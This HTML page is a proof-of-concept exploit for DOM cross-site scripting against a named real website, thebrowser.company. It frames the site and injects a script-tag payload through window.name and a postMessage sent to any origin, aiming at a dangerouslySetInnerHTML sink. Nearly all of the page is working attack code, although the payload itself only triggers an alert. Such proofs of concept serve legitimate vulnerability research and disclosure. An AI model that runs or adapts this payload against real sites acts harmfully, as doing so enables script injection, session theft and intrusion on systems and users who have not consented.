<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>ðŸ’¥ Final DOM XSS PoC â€“ thebrowser.company</title>
  <style>
    body { background: #000; color: #0f0; font-family: monospace; padding: 1rem; }
    iframe { width: 100%; height: 600px; border: 2px solid lime; margin-top: 1rem; }
  </style>
</head>
<body>

<h2>âœ… Final DOM XSS PoC</h2>
<div>ðŸ’£ Testing window.name + postMessage injection into dangerouslySetInnerHTML</div>

<iframe id="target" src="https://thebrowser.company/" sandbox="allow-scripts allow-same-origin"></iframe>

<script>
  const iframe = document.getElementById("target");

  // Payload JSON string with __html sink
  const payload = {
    props: {
      __html: "<script>alert('ðŸ”¥ DOM XSS Executed')</script>"
    }
  };

  const payloadString = JSON.stringify(payload);

  iframe.onload = () => {
    console.log("âœ… iframe loaded");

    // Set window.name with JSON
    iframe.contentWindow.name = payloadString;
    console.log("ðŸ“¦ window.name set with payload");

    // Send the same payload via postMessage
    setTimeout(() => {
      iframe.contentWindow.postMessage(payload, "*");
      console.log("ðŸš€ Payload sent via postMessage");
    }, 1000);
  };
</script>

</body>
</html>
